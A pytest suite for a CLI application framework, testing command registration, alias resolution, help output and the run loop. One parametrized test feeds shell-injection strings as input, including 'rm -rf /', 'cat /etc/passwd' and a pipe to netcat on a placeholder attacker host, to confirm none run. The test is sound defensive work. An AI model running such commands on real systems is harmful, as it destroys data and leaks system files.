"""
=============================================================================
 Licensed Materials, Property of neuraldevelopment, Munich
 Project : basefunctions
 Copyright (c) by neuraldevelopment
 All rights reserved.

 Description:
 Comprehensive pytest test suite for CLIApplication.
 Tests CLI application orchestration with CRITICAL security focus.
 Achieves >80% coverage of all execution paths.

 Log:
 v1.0.0 : Initial test implementation
 v2.0.0 : Comprehensive coverage expansion to >80%
=============================================================================
"""

# -------------------------------------------------------------
# IMPORTS
# -------------------------------------------------------------
# Standard Library
from typing import List, Dict
from unittest.mock import Mock, patch, MagicMock, call

# Third-party
import pytest

# Project imports
from basefunctions.cli import (
    CLIApplication,
    BaseCommand,
    CommandMetadata,
    ArgumentSpec,
    ContextManager,
)

# -------------------------------------------------------------
# FIXTURES
# -------------------------------------------------------------


@pytest.fixture
def cli_app() -> CLIApplication:
    """Provide CLIApplication instance without completion."""
    return CLIApplication("test_app", version="1.0", enable_completion=False)


@pytest.fixture
def cli_app_with_completion() -> CLIApplication:
    """Provide CLIApplication instance with tab completion enabled."""
    with patch("basefunctions.cli.completion_handler.readline"):
        return CLIApplication("test_app", version="1.0", enable_completion=True)


@pytest.fixture
def mock_command_handler(mock_context_manager: ContextManager) -> BaseCommand:
    """Provide mock command handler for testing."""

    class MockCommandHandler(BaseCommand):
        def __init__(self, context_manager):
            self.execute_called = False
            self.execute_args = None
            super().__init__(context_manager)

        def register_commands(self) -> Dict[str, CommandMetadata]:
            return {
                "show": CommandMetadata(
                    name="show",
                    description="Show information",
                    usage="show <item>",
                    args=[ArgumentSpec("item", "string", required=False)],
                ),
                "list": CommandMetadata(
                    name="list",
                    description="List items",
                    usage="list",
                    args=[],
                ),
            }

        def execute(self, command: str, args: List[str]) -> None:
            self.execute_called = True
            self.execute_args = (command, args)
            if command == "show":
                print(f"Showing: {args[0] if args else 'all'}")
            elif command == "list":
                print("Listing items")
            else:
                raise ValueError(f"Unknown command: {command}")

    return MockCommandHandler(mock_context_manager)


@pytest.fixture
def root_command_handler(mock_context_manager: ContextManager) -> BaseCommand:
    """Provide root-level command handler."""

    class RootCommandHandler(BaseCommand):
        def register_commands(self) -> Dict[str, CommandMetadata]:
            return {
                "version": CommandMetadata(
                    name="version",
                    description="Show version",
                    usage="version",
                    args=[],
                ),
                "status": CommandMetadata(
                    name="status",
                    description="Show status",
                    usage="status [component]",
                    args=[ArgumentSpec("component", "string", required=False)],
                ),
            }

        def execute(self, command: str, args: List[str]) -> None:
            if command == "version":
                print("Version 1.0")
            elif command == "status":
                print(f"Status: {args[0] if args else 'all'}")

    return RootCommandHandler(mock_context_manager)


@pytest.fixture
def failing_command_handler(mock_context_manager: ContextManager) -> BaseCommand:
    """Provide command handler that raises exceptions."""

    class FailingCommandHandler(BaseCommand):
        def register_commands(self) -> Dict[str, CommandMetadata]:
            return {
                "fail": CommandMetadata(
                    name="fail",
                    description="Always fails",
                    usage="fail",
                    args=[],
                ),
            }

        def execute(self, command: str, args: List[str]) -> None:
            raise RuntimeError("Command execution failed")

    return FailingCommandHandler(mock_context_manager)


# -------------------------------------------------------------
# TEST INITIALIZATION
# -------------------------------------------------------------


class TestCLIApplicationInit:
    """Tests for CLIApplication initialization."""

    def test_init_creates_instance_with_correct_attributes(self) -> None:
        """Test initialization sets all required attributes."""
        # Arrange & Act
        app = CLIApplication("myapp", version="2.0", enable_completion=False)

        # Assert
        assert app.app_name == "myapp"
        assert app.version == "2.0"
        assert app.running is True
        assert app.context is not None
        assert app.registry is not None
        assert app.parser is not None
        assert app.completion is None

    def test_init_with_completion_enabled_creates_completion_handler(self) -> None:
        """Test initialization with completion creates handler."""
        # Arrange & Act
        with patch("basefunctions.cli.completion_handler.readline"):
            app = CLIApplication("myapp", enable_completion=True)

            # Assert
            assert app.completion is not None

    def test_init_with_completion_disabled_has_no_completion_handler(self) -> None:
        """Test initialization without completion has no handler."""
        # Arrange & Act
        app = CLIApplication("myapp", enable_completion=False)

        # Assert
        assert app.completion is None

    def test_init_default_version_is_1_0(self) -> None:
        """Test default version is 1.0."""
        # Arrange & Act
        app = CLIApplication("myapp", enable_completion=False)

        # Assert
        assert app.version == "1.0"

    def test_init_creates_fresh_context_manager(self) -> None:
        """Test each app gets fresh context manager."""
        # Arrange & Act
        app1 = CLIApplication("app1", enable_completion=False)
        app2 = CLIApplication("app2", enable_completion=False)

        # Assert
        assert app1.context is not app2.context


# -------------------------------------------------------------
# TEST COMMAND REGISTRATION
# -------------------------------------------------------------


class TestCommandRegistration:
    """Tests for command and alias registration."""

    def test_register_command_group_adds_handler_to_registry(
        self, cli_app: CLIApplication, mock_command_handler: BaseCommand
    ) -> None:
        """Test register_command_group adds handler."""
        # Act
        cli_app.register_command_group("test", mock_command_handler)

        # Assert
        handlers = cli_app.registry.get_handlers("test")
        assert len(handlers) == 1
        assert handlers[0] == mock_command_handler

    def test_register_command_group_root_level(
        self, cli_app: CLIApplication, root_command_handler: BaseCommand
    ) -> None:
        """Test registering root-level commands with empty string."""
        # Act
        cli_app.register_command_group("", root_command_handler)

        # Assert
        handlers = cli_app.registry.get_handlers("")
        assert len(handlers) == 1

    def test_register_multiple_handlers_same_group(
        self,
        cli_app: CLIApplication,
        mock_command_handler: BaseCommand,
        mock_context_manager: ContextManager,
    ) -> None:
        """Test registering multiple handlers for same group."""
        # Arrange
        handler2 = type(mock_command_handler)(mock_context_manager)

        # Act
        cli_app.register_command_group("test", mock_command_handler)
        cli_app.register_command_group("test", handler2)

        # Assert
        handlers = cli_app.registry.get_handlers("test")
        assert len(handlers) == 2

    def test_register_alias_adds_to_registry(self, cli_app: CLIApplication) -> None:
        """Test register_alias adds alias mapping."""
        # Act
        cli_app.register_alias("ll", "list")

        # Assert
        aliases = cli_app.registry.get_all_aliases()
        assert "ll" in aliases

    def test_register_alias_with_group(self, cli_app: CLIApplication) -> None:
        """Test registering alias with group prefix."""
        # Act
        cli_app.register_alias("gs", "git status")

        # Assert
        aliases = cli_app.registry.get_all_aliases()
        assert aliases["gs"] == ("git", "status")

    def test_register_alias_without_group(self, cli_app: CLIApplication) -> None:
        """Test registering alias for root command."""
        # Act
        cli_app.register_alias("v", "version")

        # Assert
        aliases = cli_app.registry.get_all_aliases()
        assert aliases["v"] == ("", "version")


# -------------------------------------------------------------
# TEST COMMAND EXECUTION - CRITICAL
# -------------------------------------------------------------


class TestCommandExecution:
    """Tests for _execute_command method - CRITICAL functionality."""

    def test_execute_command_handles_quit(self, cli_app: CLIApplication) -> None:
        """Test quit command stops application."""
        # Act
        cli_app._execute_command("quit")

        # Assert
        assert cli_app.running is False

    def test_execute_command_handles_exit(self, cli_app: CLIApplication) -> None:
        """Test exit command stops application."""
        # Act
        cli_app._execute_command("exit")

        # Assert
        assert cli_app.running is False

    def test_execute_command_handles_empty_input(self, cli_app: CLIApplication) -> None:
        """Test empty input is handled gracefully."""
        # Act & Assert - Should not raise
        cli_app._execute_command("")

    def test_execute_command_handles_whitespace_only_input(self, cli_app: CLIApplication) -> None:
        """Test whitespace-only input is handled gracefully."""
        # Act & Assert - Should not raise
        cli_app._execute_command("   ")
        cli_app._execute_command("\t\t")

    def test_execute_command_with_group_and_subcommand(
        self, cli_app: CLIApplication, mock_command_handler: BaseCommand, capsys
    ) -> None:
        """Test executing group command with subcommand."""
        # Arrange
        cli_app.register_command_group("test", mock_command_handler)

        # Act
        cli_app._execute_command("test show item1")

        # Assert
        captured = capsys.readouterr()
        assert "Showing: item1" in captured.out
        assert mock_command_handler.execute_called

    def test_execute_command_with_group_without_subcommand_shows_error(
        self, cli_app: CLIApplication, mock_command_handler: BaseCommand, capsys
    ) -> None:
        """Test group without subcommand shows error and available commands."""
        # Arrange
        cli_app.register_command_group("test", mock_command_handler)

        # Act
        cli_app._execute_command("test")

        # Assert
        captured = capsys.readouterr()
        assert "requires a subcommand" in captured.out
        assert "Available:" in captured.out
        assert "show" in captured.out or "list" in captured.out

    def test_execute_command_root_level(
        self, cli_app: CLIApplication, root_command_handler: BaseCommand, capsys
    ) -> None:
        """Test executing root-level command."""
        # Arrange
        cli_app.register_command_group("", root_command_handler)

        # Act
        cli_app._execute_command("version")

        # Assert
        captured = capsys.readouterr()
        assert "Version 1.0" in captured.out

    def test_execute_command_root_level_with_args(
        self, cli_app: CLIApplication, root_command_handler: BaseCommand, capsys
    ) -> None:
        """Test executing root command with arguments."""
        # Arrange
        cli_app.register_command_group("", root_command_handler)

        # Act
        cli_app._execute_command("status database")

        # Assert
        captured = capsys.readouterr()
        assert "Status: database" in captured.out

    def test_execute_command_unknown_command_shows_error(self, cli_app: CLIApplication, capsys) -> None:
        """Test unknown command shows error message."""
        # Act
        cli_app._execute_command("nonexistent_command")

        # Assert
        captured = capsys.readouterr()
        assert "Error: Unknown command" in captured.out

    def test_execute_command_unknown_command_with_registered_commands(
        self,
        cli_app: CLIApplication,
        root_command_handler: BaseCommand,
        mock_command_handler: BaseCommand,
        capsys,
    ) -> None:
        """Test unknown command shows available commands and groups."""
        # Arrange
        cli_app.register_command_group("", root_command_handler)
        cli_app.register_command_group("test", mock_command_handler)

        # Act
        cli_app._execute_command("unknown")

        # Assert
        captured = capsys.readouterr()
        assert "Error: Unknown command" in captured.out
        assert "Available root commands:" in captured.out
        assert "Available command groups:" in captured.out

    def test_execute_command_with_alias_resolution(
        self, cli_app: CLIApplication, root_command_handler: BaseCommand, capsys
    ) -> None:
        """Test command execution with alias resolution."""
        # Arrange
        cli_app.register_command_group("", root_command_handler)
        cli_app.register_alias("v", "version")

        # Act
        cli_app._execute_command("v")

        # Assert
        captured = capsys.readouterr()
        assert "Version 1.0" in captured.out

    def test_execute_command_with_group_alias_resolution(
        self, cli_app: CLIApplication, mock_command_handler: BaseCommand, capsys
    ) -> None:
        """Test group command execution with alias."""
        # Arrange
        cli_app.register_command_group("test", mock_command_handler)
        cli_app.register_alias("tl", "test list")

        # Act
        cli_app._execute_command("tl")

        # Assert
        captured = capsys.readouterr()
        assert "Listing items" in captured.out

    def test_execute_command_handles_handler_exception(
        self, cli_app: CLIApplication, mock_context_manager: ContextManager, capsys
    ) -> None:
        """Test command execution handles handler exceptions gracefully."""

        # Arrange - Create handler where group name matches command name
        class FailingHandler(BaseCommand):
            def register_commands(self) -> Dict[str, CommandMetadata]:
                return {
                    "fail": CommandMetadata(
                        name="fail",
                        description="Always fails",
                        usage="fail",
                        args=[],
                    ),
                }

            def execute(self, command: str, args: List[str]) -> None:
                raise RuntimeError("Command execution failed")

        handler = FailingHandler(mock_context_manager)
        cli_app.register_command_group("fail", handler)

        # Act
        cli_app._execute_command("fail fail")

        # Assert
        captured = capsys.readouterr()
        assert "Error:" in captured.out
        assert "Command execution failed" in captured.out

    def test_execute_command_unknown_subcommand_shows_error(
        self, cli_app: CLIApplication, mock_command_handler: BaseCommand, capsys
    ) -> None:
        """Test unknown subcommand in valid group shows error."""
        # Arrange
        cli_app.register_command_group("test", mock_command_handler)

        # Act
        cli_app._execute_command("test unknown")

        # Assert
        captured = capsys.readouterr()
        assert "Error:" in captured.out
        assert "Unknown command" in captured.out or "Available:" in captured.out

    def test_execute_command_group_matching_command_name(
        self, cli_app: CLIApplication, mock_context_manager: ContextManager, capsys
    ) -> None:
        """Test group command that matches its own command name."""

        # Arrange
        class SelfNamedHandler(BaseCommand):
            def register_commands(self) -> Dict[str, CommandMetadata]:
                return {
                    "config": CommandMetadata(
                        name="config",
                        description="Config command",
                        usage="config <action>",
                        args=[ArgumentSpec("action", "string", required=True)],
                    )
                }

            def execute(self, command: str, args: List[str]) -> None:
                print(f"Config action: {args[0] if args else 'none'}")

        handler = SelfNamedHandler(mock_context_manager)
        cli_app.register_command_group("config", handler)

        # Act
        cli_app._execute_command("config set")

        # Assert
        captured = capsys.readouterr()
        assert "Config action: set" in captured.out

    @pytest.mark.parametrize(
        "malicious_input",
        [
            "command; rm -rf /",
            "command && cat /etc/passwd",
            "command | nc attacker 4444",
            "command `whoami`",
            "command $(whoami)",
        ],
    )
    def test_execute_command_does_not_execute_shell_commands(
        self, cli_app: CLIApplication, malicious_input: str, capsys
    ) -> None:
        """Test malicious input does not execute shell commands (CRITICAL)."""
        # Act
        cli_app._execute_command(malicious_input)

        # Assert
        captured = capsys.readouterr()
        # Should show error, not execute shell command
        assert "Error: Unknown command" in captured.out or "Error:" in captured.out

    def test_execute_command_multi_handler_dispatch_first_match(
        self,
        cli_app: CLIApplication,
        mock_command_handler: BaseCommand,
        mock_context_manager: ContextManager,
        capsys,
    ) -> None:
        """Test multi-handler dispatch uses first matching handler."""

        # Arrange
        class SecondHandler(BaseCommand):
            def register_commands(self) -> Dict[str, CommandMetadata]:
                return {
                    "other": CommandMetadata(
                        name="other",
                        description="Other command",
                        usage="other",
                        args=[],
                    )
                }

            def execute(self, command: str, args: List[str]) -> None:
                print("Second handler executed")

        handler2 = SecondHandler(mock_context_manager)
        cli_app.register_command_group("test", mock_command_handler)
        cli_app.register_command_group("test", handler2)

        # Act
        cli_app._execute_command("test list")

        # Assert
        captured = capsys.readouterr()
        assert "Listing items" in captured.out

    def test_execute_command_group_with_args_when_command_exists(
        self, cli_app: CLIApplication, mock_context_manager: ContextManager, capsys
    ) -> None:
        """Test group command with args when command name exists in group."""

        # Arrange
        class ArgsHandler(BaseCommand):
            def register_commands(self) -> Dict[str, CommandMetadata]:
                return {
                    "show": CommandMetadata(
                        name="show",
                        description="Show with args",
                        usage="show <item>",
                        args=[ArgumentSpec("item", "string", required=True)],
                    )
                }

            def execute(self, command: str, args: List[str]) -> None:
                if command == "show":
                    print(f"Showing item: {args[0] if args else 'none'}")

        handler = ArgsHandler(mock_context_manager)
        cli_app.register_command_group("test", handler)

        # Act
        cli_app._execute_command("test show item1")

        # Assert
        captured = capsys.readouterr()
        assert "Showing item: item1" in captured.out


# -------------------------------------------------------------
# TEST HELP COMMAND
# -------------------------------------------------------------


class TestHelpCommand:
    """Tests for help command functionality."""

    def test_execute_help_shows_general_help(
        self,
        cli_app: CLIApplication,
        root_command_handler: BaseCommand,
        mock_command_handler: BaseCommand,
        capsys,
    ) -> None:
        """Test help command shows general help."""
        # Arrange
        cli_app.register_command_group("", root_command_handler)
        cli_app.register_command_group("test", mock_command_handler)

        # Act
        cli_app._execute_command("help")

        # Assert
        captured = capsys.readouterr()
        assert "ROOT COMMANDS" in captured.out
        assert "TEST COMMANDS" in captured.out
        assert "GENERAL" in captured.out  # Now in table, not as "GENERAL:"
        assert "help" in captured.out
        assert "quit" in captured.out or "exit" in captured.out

    def test_execute_help_shows_aliases(self, cli_app: CLIApplication, capsys) -> None:
        """Test help shows registered aliases."""
        # Arrange
        cli_app.register_alias("v", "version")
        cli_app.register_alias("gs", "git status")

        # Act
        cli_app._execute_command("help")

        # Assert
        captured = capsys.readouterr()
        assert "ALIASES" in captured.out  # Now in table, not as "ALIASES:"
        assert "v" in captured.out
        assert "gs" in captured.out

    def test_execute_help_aliases_shows_aliases_only(self, cli_app: CLIApplication, capsys) -> None:
        """Test help aliases shows only alias information."""
        # Arrange
        cli_app.register_alias("v", "version")

        # Act
        cli_app._execute_command("help aliases")

        # Assert
        captured = capsys.readouterr()
        assert "ALIASES" in captured.out
        assert "v" in captured.out

    def test_execute_help_aliases_with_no_aliases(self, cli_app: CLIApplication, capsys) -> None:
        """Test help aliases when no aliases registered."""
        # Act
        cli_app._execute_command("help aliases")

        # Assert
        captured = capsys.readouterr()
        assert "No aliases configured" in captured.out

    def test_execute_help_for_specific_group(
        self, cli_app: CLIApplication, mock_command_handler: BaseCommand, capsys
    ) -> None:
        """Test help for specific command group."""
        # Arrange
        cli_app.register_command_group("test", mock_command_handler)

        # Act
        cli_app._execute_command("help test")

        # Assert
        captured = capsys.readouterr()
        assert "show" in captured.out.lower() or "list" in captured.out.lower()

    def test_execute_help_for_unknown_group(self, cli_app: CLIApplication, capsys) -> None:
        """Test help for unknown group shows error."""
        # Act
        cli_app._execute_command("help unknown")

        # Assert
        captured = capsys.readouterr()
        assert "Unknown command:" in captured.out

    def test_execute_help_for_specific_command_in_group(
        self, cli_app: CLIApplication, mock_command_handler: BaseCommand, capsys
    ) -> None:
        """Test help for specific command in group."""
        # Arrange
        cli_app.register_command_group("test", mock_command_handler)

        # Act
        cli_app._execute_command("help test show")

        # Assert
        captured = capsys.readouterr()
        assert "show" in captured.out.lower()

    def test_show_general_help_without_aliases(
        self, cli_app: CLIApplication, root_command_handler: BaseCommand, capsys
    ) -> None:
        """Test general help without any aliases."""
        # Arrange
        cli_app.register_command_group("", root_command_handler)

        # Act
        cli_app._show_general_help()

        # Assert
        captured = capsys.readouterr()
        assert "ROOT COMMANDS" in captured.out
        assert "ALIASES:" not in captured.out


# -------------------------------------------------------------
# TEST RUN LOOP
# -------------------------------------------------------------


class TestRunLoop:
    """Tests for run loop functionality."""

    def test_run_shows_welcome_message(self, cli_app: CLIApplication, capsys) -> None:
        """Test run displays welcome message."""
        # Arrange
        with patch("builtins.input", side_effect=["quit"]):
            # Act
            cli_app.run()

        # Assert
        captured = capsys.readouterr()
        assert "test_app v1.0" in captured.out
        assert "Type 'help' for commands" in captured.out

    def test_run_handles_keyboard_interrupt_gracefully(self, cli_app: CLIApplication, capsys) -> None:
        """Test run handles KeyboardInterrupt without crash."""
        # Arrange
        with patch("builtins.input", side_effect=KeyboardInterrupt()):
            # Act & Assert - Should not raise
            cli_app.run()

        # Assert
        captured = capsys.readouterr()
        assert "Exiting..." in captured.out

    def test_run_handles_eof_gracefully(self, cli_app: CLIApplication) -> None:
        """Test run handles EOFError without crash."""
        # Arrange
        with patch("builtins.input", side_effect=EOFError()):
            # Act & Assert - Should not raise
            cli_app.run()

    def test_run_executes_multiple_commands(
        self, cli_app: CLIApplication, root_command_handler: BaseCommand, capsys
    ) -> None:
        """Test run loop executes multiple commands in sequence."""
        # Arrange
        cli_app.register_command_group("", root_command_handler)
        with patch("builtins.input", side_effect=["version", "status", "quit"]):
            # Act
            cli_app.run()

        # Assert
        captured = capsys.readouterr()
        assert "Version 1.0" in captured.out
        assert "Status: all" in captured.out
        assert "Goodbye!" in captured.out

    def test_run_skips_empty_input(self, cli_app: CLIApplication, root_command_handler: BaseCommand) -> None:
        """Test run loop skips empty input lines."""
        # Arrange
        cli_app.register_command_group("", root_command_handler)
        with patch("builtins.input", side_effect=["", "   ", "quit"]):
            # Act & Assert - Should not raise
            cli_app.run()

    def test_run_calls_cleanup_on_exit(self, cli_app: CLIApplication) -> None:
        """Test run calls cleanup when exiting."""
        # Arrange
        with patch("builtins.input", side_effect=["quit"]):
            with patch.object(cli_app, "_cleanup") as mock_cleanup:
                # Act
                cli_app.run()

                # Assert
                mock_cleanup.assert_called_once()

    def test_run_with_completion_enabled_calls_cleanup(self, cli_app_with_completion: CLIApplication) -> None:
        """Test cleanup is called with completion enabled."""
        # Arrange
        with patch("builtins.input", side_effect=["quit"]):
            # Act
            cli_app_with_completion.run()

        # Assert - Should complete without errors


# -------------------------------------------------------------
# TEST QUIT COMMAND
# -------------------------------------------------------------


class TestQuitCommand:
    """Tests for quit/exit command."""

    def test_cmd_quit_sets_running_to_false(self, cli_app: CLIApplication) -> None:
        """Test _cmd_quit sets running flag to False."""
        # Arrange
        assert cli_app.running is True

        # Act
        cli_app._cmd_quit()

        # Assert
        assert cli_app.running is False

    def test_cmd_quit_prints_goodbye(self, cli_app: CLIApplication, capsys) -> None:
        """Test _cmd_quit prints goodbye message."""
        # Act
        cli_app._cmd_quit()

        # Assert
        captured = capsys.readouterr()
        assert "Goodbye!" in captured.out


# -------------------------------------------------------------
# TEST WELCOME AND CLEANUP
# -------------------------------------------------------------


class TestWelcomeAndCleanup:
    """Tests for welcome and cleanup functionality."""

    def test_show_welcome_displays_app_info(self, cli_app: CLIApplication, capsys) -> None:
        """Test _show_welcome displays application information."""
        # Act
        cli_app._show_welcome()

        # Assert
        captured = capsys.readouterr()
        assert "test_app v1.0" in captured.out
        assert "Type 'help' for commands" in captured.out
        assert "quit" in captured.out

    def test_cleanup_without_completion(self, cli_app: CLIApplication) -> None:
        """Test _cleanup without completion handler."""
        # Act & Assert - Should not raise
        cli_app._cleanup()

    def test_cleanup_with_completion_calls_cleanup(self, cli_app_with_completion: CLIApplication) -> None:
        """Test _cleanup calls completion handler cleanup."""
        # Arrange
        mock_completion = Mock()
        cli_app_with_completion.completion = mock_completion

        # Act
        cli_app_with_completion._cleanup()

        # Assert
        mock_completion.cleanup.assert_called_once()


# -------------------------------------------------------------
# TEST EDGE CASES AND ERROR HANDLING
# -------------------------------------------------------------


class TestEdgeCases:
    """Tests for edge cases and error handling."""

    def test_execute_group_command_without_subcommand_succeeds(
        self, cli_app: CLIApplication, mock_context_manager: ContextManager, capsys
    ) -> None:
        """Test group command without subcommand executes successfully."""

        # Arrange - Handler that validates and executes successfully
        class SuccessHandler(BaseCommand):
            def register_commands(self) -> Dict[str, CommandMetadata]:
                return {
                    "info": CommandMetadata(
                        name="info",
                        description="Show info",
                        usage="info",
                        args=[],
                    ),
                }

            def execute(self, command: str, args: List[str]) -> None:
                print("Info displayed successfully")

        handler = SuccessHandler(mock_context_manager)
        cli_app.register_command_group("info", handler)

        # Act
        cli_app._execute_command("info")

        # Assert
        captured = capsys.readouterr()
        assert "Info displayed successfully" in captured.out

    def test_execute_group_command_without_subcommand_raises_exception(
        self, cli_app: CLIApplication, mock_context_manager: ContextManager, capsys
    ) -> None:
        """Test group command without subcommand that raises exception during validation."""

        # Arrange - Handler that validates command but raises on execution
        class ValidatingFailHandler(BaseCommand):
            def register_commands(self) -> Dict[str, CommandMetadata]:
                return {
                    "test": CommandMetadata(
                        name="test",
                        description="Test command",
                        usage="test",
                        args=[],
                    ),
                }

            def execute(self, command: str, args: List[str]) -> None:
                raise RuntimeError("Validation failed")

        handler = ValidatingFailHandler(mock_context_manager)
        cli_app.register_command_group("test", handler)

        # Act
        cli_app._execute_command("test")

        # Assert
        captured = capsys.readouterr()
        assert "Error:" in captured.out
        assert "Validation failed" in captured.out

    def test_execute_root_command_raises_exception(
        self, cli_app: CLIApplication, mock_context_manager: ContextManager, capsys
    ) -> None:
        """Test root command that raises exception during execution."""

        # Arrange
        class FailingRootHandler(BaseCommand):
            def register_commands(self) -> Dict[str, CommandMetadata]:
                return {
                    "crash": CommandMetadata(
                        name="crash",
                        description="Crashes on execution",
                        usage="crash",
                        args=[],
                    ),
                }

            def execute(self, command: str, args: List[str]) -> None:
                raise RuntimeError("Root command failed")

        handler = FailingRootHandler(mock_context_manager)
        cli_app.register_command_group("", handler)

        # Act
        cli_app._execute_command("crash")

        # Assert
        captured = capsys.readouterr()
        assert "Error:" in captured.out
        assert "Root command failed" in captured.out

    def test_show_general_help_with_empty_handlers_list(self, cli_app: CLIApplication, capsys) -> None:
        """Test general help when registry has groups with no handlers."""
        # Arrange - Manually manipulate registry to have empty handlers
        cli_app.registry._groups["empty_group"] = []

        # Act
        cli_app._show_general_help()

        # Assert - Should not crash, should skip empty group
        captured = capsys.readouterr()
        assert "GENERAL" in captured.out  # Now in table, not as "GENERAL:"

    def test_execute_command_with_very_long_input(self, cli_app: CLIApplication, capsys) -> None:
        """Test execution with very long input string."""
        # Arrange
        long_input = "command " + "arg " * 1000

        # Act
        cli_app._execute_command(long_input)

        # Assert
        captured = capsys.readouterr()
        assert "Error: Unknown command" in captured.out

    def test_show_general_help_displays_aliases_as_table(self, cli_app: CLIApplication, capsys) -> None:
        """Test that ALIASES section is displayed as table with format_command_list."""
        # Arrange
        cli_app.register_alias("ll", "list")
        cli_app.register_alias("quit", "exit")

        # Act
        cli_app._show_general_help()

        # Assert
        captured = capsys.readouterr()
        # Should contain table structure
        assert "│" in captured.out or "|" in captured.out
        # Should contain ALIASES group name in table
        assert "ALIASES" in captured.out
        # Should contain alias commands
        assert "ll" in captured.out

    def test_show_general_help_displays_general_as_table(self, cli_app: CLIApplication, capsys) -> None:
        """Test that GENERAL section is displayed as table with format_command_list."""
        # Act
        cli_app._show_general_help()

        # Assert
        captured = capsys.readouterr()
        # Should contain table structure
        assert "│" in captured.out or "|" in captured.out
        # Should contain GENERAL group name in table
        assert "GENERAL" in captured.out
        # Should contain general commands
        assert "help" in captured.out
        assert "quit" in captured.out or "exit" in captured.out

    def test_execute_command_with_special_characters(self, cli_app: CLIApplication, capsys) -> None:
        """Test execution with special characters."""
        # Act
        cli_app._execute_command("command@#$%")

        # Assert
        captured = capsys.readouterr()
        assert "Error: Unknown command" in captured.out

    def test_execute_command_with_unicode_characters(self, cli_app: CLIApplication, capsys) -> None:
        """Test execution with unicode characters."""
        # Act
        cli_app._execute_command("café ☕")

        # Assert
        captured = capsys.readouterr()
        assert "Error: Unknown command" in captured.out

    def test_execute_command_with_quoted_arguments(
        self, cli_app: CLIApplication, root_command_handler: BaseCommand, capsys
    ) -> None:
        """Test execution with quoted arguments."""
        # Arrange
        cli_app.register_command_group("", root_command_handler)

        # Act
        cli_app._execute_command('status "my component"')

        # Assert
        captured = capsys.readouterr()
        assert "Status: my component" in captured.out

    def test_execute_command_handler_exception_is_logged(
        self, cli_app: CLIApplication, mock_context_manager: ContextManager
    ) -> None:
        """Test handler exceptions are properly logged."""

        # Arrange - Create handler where group name matches command name
        class FailingHandler(BaseCommand):
            def register_commands(self) -> Dict[str, CommandMetadata]:
                return {
                    "fail": CommandMetadata(
                        name="fail",
                        description="Always fails",
                        usage="fail",
                        args=[],
                    ),
                }

            def execute(self, command: str, args: List[str]) -> None:
                raise RuntimeError("Command execution failed")

        handler = FailingHandler(mock_context_manager)
        cli_app.register_command_group("fail", handler)

        # Act & Assert - Should not raise
        cli_app._execute_command("fail fail")

    def test_execute_command_preserves_original_command_in_error(self, cli_app: CLIApplication, capsys) -> None:
        """Test error messages show original command, not resolved alias."""
        # Arrange
        cli_app.register_alias("unknown_alias", "nonexistent_target")

        # Act
        cli_app._execute_command("some_unknown_command")

        # Assert
        captured = capsys.readouterr()
        assert "some_unknown_command" in captured.out

    def test_register_command_group_with_empty_commands(
        self, cli_app: CLIApplication, mock_context_manager: ContextManager, capsys
    ) -> None:
        """Test registering handler with no commands."""

        # Arrange
        class EmptyHandler(BaseCommand):
            def register_commands(self) -> Dict[str, CommandMetadata]:
                return {}

            def execute(self, command: str, args: List[str]) -> None:
                pass

        handler = EmptyHandler(mock_context_manager)
        cli_app.register_command_group("empty", handler)

        # Act
        cli_app._execute_command("empty")

        # Assert
        captured = capsys.readouterr()
        assert "requires a subcommand" in captured.out

    def test_help_with_empty_handlers(
        self, cli_app: CLIApplication, mock_context_manager: ContextManager, capsys
    ) -> None:
        """Test help command with handlers that have no commands."""

        # Arrange
        class EmptyHandler(BaseCommand):
            def register_commands(self) -> Dict[str, CommandMetadata]:
                return {}

            def execute(self, command: str, args: List[str]) -> None:
                pass

        handler = EmptyHandler(mock_context_manager)
        cli_app.register_command_group("empty", handler)

        # Act
        cli_app._execute_command("help")

        # Assert - Should not crash
        captured = capsys.readouterr()
        assert "GENERAL" in captured.out  # Now in table, not as "GENERAL:"


# -------------------------------------------------------------
# TEST COMPLEX SCENARIOS
# -------------------------------------------------------------


class TestComplexScenarios:
    """Tests for complex interaction scenarios."""

    def test_multiple_command_groups_with_aliases(
        self,
        cli_app: CLIApplication,
        root_command_handler: BaseCommand,
        mock_command_handler: BaseCommand,
        capsys,
    ) -> None:
        """Test complex scenario with multiple groups and aliases."""
        # Arrange
        cli_app.register_command_group("", root_command_handler)
        cli_app.register_command_group("test", mock_command_handler)
        cli_app.register_alias("v", "version")
        cli_app.register_alias("tl", "test list")

        # Act
        cli_app._execute_command("v")
        cli_app._execute_command("tl")
        cli_app._execute_command("status")

        # Assert
        captured = capsys.readouterr()
        assert "Version 1.0" in captured.out
        assert "Listing items" in captured.out
        assert "Status: all" in captured.out

    def test_command_execution_sequence_with_errors(
        self,
        cli_app: CLIApplication,
        root_command_handler: BaseCommand,
        mock_context_manager: ContextManager,
        capsys,
    ) -> None:
        """Test that errors don't break subsequent commands."""

        # Arrange
        class FailingHandler(BaseCommand):
            def register_commands(self) -> Dict[str, CommandMetadata]:
                return {
                    "fail": CommandMetadata(
                        name="fail",
                        description="Always fails",
                        usage="fail",
                        args=[],
                    ),
                }

            def execute(self, command: str, args: List[str]) -> None:
                raise RuntimeError("Command execution failed")

        handler = FailingHandler(mock_context_manager)
        cli_app.register_command_group("", root_command_handler)
        cli_app.register_command_group("fail", handler)

        # Act
        cli_app._execute_command("fail fail")
        cli_app._execute_command("version")

        # Assert
        captured = capsys.readouterr()
        assert "Error:" in captured.out
        assert "Version 1.0" in captured.out

    def test_root_and_group_handlers_coexist(
        self,
        cli_app: CLIApplication,
        root_command_handler: BaseCommand,
        mock_command_handler: BaseCommand,
        capsys,
    ) -> None:
        """Test root and group handlers work together."""
        # Arrange
        cli_app.register_command_group("", root_command_handler)
        cli_app.register_command_group("test", mock_command_handler)

        # Act
        cli_app._execute_command("version")
        cli_app._execute_command("test show data")
        cli_app._execute_command("status component")

        # Assert
        captured = capsys.readouterr()
        assert "Version 1.0" in captured.out
        assert "Showing: data" in captured.out
        assert "Status: component" in captured.out

    def test_help_shows_all_groups_and_commands(
        self,
        cli_app: CLIApplication,
        root_command_handler: BaseCommand,
        mock_command_handler: BaseCommand,
        capsys,
    ) -> None:
        """Test help shows complete command structure."""
        # Arrange
        cli_app.register_command_group("", root_command_handler)
        cli_app.register_command_group("test", mock_command_handler)
        cli_app.register_alias("v", "version")

        # Act
        cli_app._execute_command("help")

        # Assert
        captured = capsys.readouterr()
        assert "ROOT COMMANDS" in captured.out
        assert "TEST COMMANDS" in captured.out
        assert "ALIASES" in captured.out  # Now in table, not as "ALIASES:"
        assert "GENERAL" in captured.out  # Now in table, not as "GENERAL:"
        assert "help" in captured.out
        assert "quit" in captured.out


# -------------------------------------------------------------
